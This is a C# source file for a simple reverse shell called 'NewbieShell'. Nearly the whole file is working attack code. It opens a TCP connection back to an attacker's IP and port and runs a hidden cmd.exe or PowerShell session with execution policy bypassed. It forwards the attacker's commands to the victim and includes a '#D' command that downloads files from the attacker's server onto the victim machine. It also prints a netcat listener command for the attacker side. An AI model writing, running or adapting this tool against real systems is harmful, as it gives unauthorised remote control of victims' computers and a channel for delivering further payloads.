using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace NewbieShell
{
    class Program
    {
        static StreamWriter streamWriter;
        static string ip;
        static void Main(string[] args)
        {
            /// if no args, then attacker question
            if (args.Length > 0)
            {
                /// Powershell.exe
                if (args[2] == "powershell.exe")
                {
                    Console.WriteLine("Execute Powershell");
                    ip = args[0];
                    Connection(args[0], Convert.ToInt32(args[1]), "powershell.exe");
                }
                /// cmd.exe
                else
                {
                    Console.WriteLine("Execute cmd.exe");
                    Connection(args[0], Convert.ToInt32(args[1]), "cmd.exe");
                }
            }
            else
            {
                Console.Write("Attacker IP Address: ");

                ip = Console.ReadLine().ToString();
                int port = 0;

                if (ip == null || ip == "")
                {
                    Console.WriteLine("Error: No IP-Address");
                }
                else
                {
                    Console.Write("Attacker Port: ");
                    port = Convert.ToInt32(Console.ReadLine());

                    if (port != 0)
                    {
                        Console.Write("Press 0 for 'cmd shell' or 1 for 'powershell' ");
                        string shell = Console.ReadLine();
                        string command = string.Empty;

                        if (shell == "0")
                        {
                            command = "cmd.exe";
                        }
                        else if (shell == "1")
                        {
                            command = "powershell.exe";
                        }
                        else
                        {
                            command = "cmd.exe";
                        }

                        Console.WriteLine(string.Format("Start Netcat with this command 'nc -vlnp {0}' on the attacker PC: ", port));
                        Console.Write("Press a button");
                        Console.ReadLine();

                        Connection(ip, port, command);
                    }
                    else
                    {
                        Console.WriteLine("Error: No port");
                    }
                }
            }
        }

        /// <summary>
        /// Print data on the attacker screen.
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err)
                {
                    Console.WriteLine(err);
                }
            }
        }

        /// <summary>
        /// Connection
        /// </summary>
        /// <param name="ip">IP - Address</param>
        /// <param name="port">Port</param>
        /// <param name="command">Process - Command</param>
        private static void Connection(string ip, int port, string command)
        {
            try
            {
                // TCP - Connection
                using (TcpClient client = new TcpClient(ip, port))
                {
                    // Get the stream
                    using (Stream stream = client.GetStream())
                    {
                        // Streamreader
                        using (StreamReader rdr = new StreamReader(stream))
                        {
                            streamWriter = new StreamWriter(stream);
                            StringBuilder strInput = new StringBuilder();

                            #region Process properties
                            Process p = new Process();
                            p.StartInfo.FileName = command;

                            // When the command is powershell.exe then write as argument "-ep bypass" to bypass the Powershell
                            // Execution Policy
                            if (command == "powershell.exe")
                            {
                                p.StartInfo.Arguments = "-ep bypass";
                            }

                            p.StartInfo.CreateNoWindow = true;
                            p.StartInfo.UseShellExecute = false;
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.RedirectStandardInput = true;
                            p.StartInfo.RedirectStandardError = true;
                            p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            p.Start();
                            p.BeginOutputReadLine();
                            #endregion

                            //If the attacker writes something into the terminal, then this command is executed at the victim.
                            while (true)
                            {
                                try
                                {
                                    //Read command from terminal.
                                    strInput.Append(rdr.ReadLine());

                                    //The #D - Command stands for "Download". The attacker can download the data from a web server. 
                                    //Therefore the system takes the IP - Address from the Reverse Shell and the port 80. 
                                    if (strInput.ToString() == "#D")
                                    {
                                        strInput.Remove(0, strInput.Length);
                                        p.StandardInput.WriteLine("Name of downloaded file:");
                                        strInput.Append(rdr.ReadLine());

                                        WebClient myWebClient = new WebClient();
                                        string webresource = "http://" + ip + "/" + strInput.ToString();
                                        myWebClient.DownloadFile(webresource, strInput.ToString());
                                        strInput.Remove(0, strInput.Length);
                                    }
                                    else
                                    {
                                        p.StandardInput.WriteLine(strInput);
                                        strInput.Remove(0, strInput.Length);
                                    }

                                }
                                // Exception error.
                                catch (Exception)
                                {
                                    Console.WriteLine("Connection broken.");
                                    Environment.Exit(0);
                                    client.Close();
                                }

                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Environment.Exit(0);
            }

        }
    }
}
